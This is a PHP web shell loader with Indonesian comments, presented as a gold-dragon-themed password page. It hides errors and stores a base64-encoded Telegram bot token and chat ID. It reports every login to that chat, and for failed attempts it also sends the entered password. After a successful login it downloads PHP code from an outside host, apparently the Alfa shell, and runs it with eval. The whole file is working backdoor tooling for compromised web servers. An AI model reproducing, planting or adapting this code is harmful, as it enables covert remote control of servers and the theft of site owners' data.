<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

// --- KONFIGURASI TELEGRAM (ENCRYPTED) ---
$t_tkn = base64_decode("ODcyNTEwNzc2MTpBQUVhMEg3SEdqY1h6NUF5QnpLRnQ0a05VWlBfZTlPY3Izaw==");
$c_id  = base64_decode("Njc4NjA3Mjg2OQ==");

function sendTelegram($msg) {
    global $t_tkn, $c_id;
    $url = "https://api.telegram.org/bot$t_tkn/sendMessage?chat_id=$c_id&text=" . urlencode($msg);
    
    // Menggunakan stream_context untuk melakukan HTTP request tanpa CURL
    $opts = [
        "http" => [
            "method" => "GET",
            "timeout" => 5
        ]
    ];
    $context = stream_context_create($opts);
    @file_get_contents($url, false, $context);
}

// --- LOGIKA LOGIN & OTORISASI ---
$valid_password_hash = '$2a$12$jeMvM33nHB8vRlj5Cii2MufQPZAZ1LYwvAosfV4r8/9xN5aXeKN76';
$error = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $valid_password_hash)) {
        $_SESSION['FORBIDDENXER'] = 'active';
        $ip = $_SERVER['REMOTE_ADDR'];
        $waktu = date("d-m-Y H:i:s");
        sendTelegram("✅ LOGIN BERHASIL\nIP: $ip\nWaktu: $waktu\nURL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        sendTelegram("⚠️ PERCOBAAN GAGAL\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nPass: " . $_POST['password']);
        $error = "SALAH PASSWORD MEN...!!!";
    }
}

// --- EKSEKUSI SHELL JIKA LOGIN ---
if (isset($_SESSION['FORBIDDENXER']) && $_SESSION['FORBIDDENXER'] === 'active') {
    $url = 'https://raw.zeverix.com/public/raw/my-alfa-303';
    $content = @file_get_contents($url);
    if ($content) {
        eval('?>' . $content);
        exit;
    } else {
        die("Error: Failed to fetch payload.");
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SECURE ACCESS | ELITE GATE</title>
    <link rel="shortcut icon" href="https://ik.imagekit.io/gambarkita/icon-naga.png" type="image/png">
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; 
               background: url('https://ik.imagekit.io/akstoto/backround/chinese-gold-dragon.webp') no-repeat center center fixed; 
               background-size: cover; font-family: 'Courier New', monospace; color: #d4af37; }
        .overlay { background: rgba(0, 0, 0, 0.85); padding: 50px; border: 2px solid #d4af37; 
                   border-radius: 5px; text-align: center; backdrop-filter: blur(8px); }
        input { background: transparent; border: 1px solid #d4af37; color: #d4af37; 
                padding: 12px; width: 250px; text-align: center; outline: none; }
        .caution { color: #ff3333; margin-top: 15px; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="overlay">
        <h1>AUTHENTICATION</h1>
        <form method="post">
            <input type="password" name="password" placeholder="MASUKKAN PASSWORD...!!!" autofocus required>
            <?php if($error) echo "<div class='caution'>$error</div>"; ?>
        </form>
    </div>
</body>
</html>
